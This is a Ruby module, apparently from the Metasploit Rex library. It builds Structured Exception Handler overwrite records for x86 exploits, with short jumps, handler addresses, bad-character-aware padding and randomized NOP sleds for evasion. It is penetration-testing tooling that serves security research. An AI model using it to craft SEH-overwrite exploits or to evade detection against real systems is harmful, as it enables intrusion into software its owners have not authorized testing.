require 'rex/text'
require 'rex/arch/x86'
require 'rex/evasion'

module Rex
module Exploitation

###
#
# This class provides methods for generating SEH registration records
# in a dynamic and flexible fashion.  The records can be generated with
# the short jump at a random offset into the next pointer and with random
# padding in between the handler and the attacker's payload.
#
###
class Seh

	#
	# The symbolic name of this evasion subsystem.
	#
	EvasionName = "exploitation.seh"

	#
	# Creates a new instance of the class and initializes it with the supplied
	# bad character list.  The space argument denotes how much room is
	# available for random padding and the NOP argument can be used to generate
	# a random NOP sled that is better than 0x90.
	#
	def initialize(badchars = nil, space = nil, nop = nil)
		self.badchars = badchars || ''
		self.space    = (space && space > 121) ? 121 : space
		self.nop      = nop
	end

	#
	# Return the default evasion level for this subsystem.
	#
	def default_evasion_level
		Rex::Evasion.get_subsys_level(EvasionName)
	end

	#
	# Generates an SEH record using whatever evasion level is currently defined
	# globally for this subsystem or using one that is supplied by the caller.
	# If HIGH evasion is specified, a dynamic SEH record is generated.
	# Otherwise, a static SEH record is generated.
	#
	def generate_seh_record(handler, evlvl = default_evasion_level)
		if (evlvl == EVASION_HIGH)
			generate_dynamic_seh_record(handler)
		else
			generate_static_seh_record(handler)
		end
	end

	#
	# Generates a fake SEH registration record with the supplied handler
	# address for the handler, and a nop generator to use when generating
	# padding inside the next pointer.  The NOP generator must implement the
	# 'generate_sled' method that takes a length and a list of bad 
	# characters.
	#
	def generate_dynamic_seh_record(handler)

		# Generate the padding up to the size specified or 121 characters
		# maximum to account for the maximum range of a short jump plus the
		# record size.
		pad    = rand(space || 121)
		rsize  = pad + 8

		# Calculate the random index into the next ptr to store the short jump
		# instruction
		jmpidx = rand(3)

		# Build the prefixed sled for the bytes that come before the short jump
		# instruction
		sled = (nop) ? nop.generate_sled(jmpidx, badchars) : ("\x90" * jmpidx)

		# Seed the record and any space after the record with random text
		record = Rex::Text.rand_text(rsize, badchars)

		# Build the next pointer and short jump instruction
		record[jmpidx, 2] = Rex::Arch::X86.jmp_short((rsize - jmpidx) - 2)
		record[0, jmpidx] = sled

		# Set the handler in the registration record
		record[4, 4]      = [ handler ].pack('V')

		# Return the generated record to the caller
		record
	end

	#
	# Generates a static SEH registration record with a specific handler and
	# next pointer.
	#
	def generate_static_seh_record(handler)
		"\xeb\x06" + Rex::Text.rand_text(2, badchars) + [ handler ].pack('V')
	end

protected

	attr_accessor :badchars, :space, :nop # :nodoc:

end

end
end

#
# Register this evasion subsystem with the evasion instance.
#
Rex::Evasion.register_subsys(Rex::Exploitation::Seh::EvasionName)
